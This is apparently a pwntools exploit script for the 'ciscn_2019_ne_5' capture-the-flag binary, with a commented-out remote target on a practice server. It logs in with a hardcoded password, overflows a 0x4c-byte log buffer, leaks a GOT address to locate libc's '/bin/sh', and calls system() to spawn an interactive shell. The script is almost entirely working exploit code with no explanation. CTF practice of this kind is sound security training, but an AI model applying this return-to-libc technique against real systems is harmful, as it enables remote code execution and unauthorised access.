from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='i386', os='linux')

elf = ELF('./ciscn_2019_ne_5')
start = 0x08048722
system = 0x080484d0
exit = 0x080484e0
leak_func = 'printf'
#leak_func = 'puts'
sh_str = 0x080482ea

leak_got = elf.got[leak_func]
puts_plt = elf.plt['puts']

#conn = remote('node4.buuoj.cn', 28775)
conn = process('./ciscn_2019_ne_5')
#gdb.attach(conn, 'b *0x080486fc')
conn.sendlineafter(b'password:', b'administrator')

def add_log(log):
    conn.sendlineafter(b'Exit\n:', b'1')
    conn.sendlineafter(b'info:', log)

def exp1():
    payload = b'a'*0x4c + p32(puts_plt) + p32(start) + p32(leak_got)
    add_log(payload)
    conn.sendlineafter(b'Exit\n:', b'4')

    conn.recvuntil(b'\n')
    res = conn.recvuntil(b'\n')
    leak_addr = u32(res[:4])
    print(f'leak_addr: {hex(leak_addr)}')
    libc = LibcSearcher(leak_func, leak_addr)
    libc_base = leak_addr - libc.dump(leak_func)
    binsh = libc_base + libc.dump('str_bin_sh')
    print(f'binsh: {hex(binsh)}')
    
    conn.sendlineafter(b'password:', b'administrator')
    payload = b'a' * 0x4c + p32(system) + b'aaaa' + p32(binsh)
    add_log(payload)
    conn.sendlineafter(b'Exit\n:', b'4')

    conn.interactive()

def exp2():
    payload = b'a'*0x4c + p32(system) + b'aaaa' + p32(sh_str)
    add_log(payload)
    conn.sendlineafter(b'Exit\n:', b'4')

    conn.interactive()

exp2()
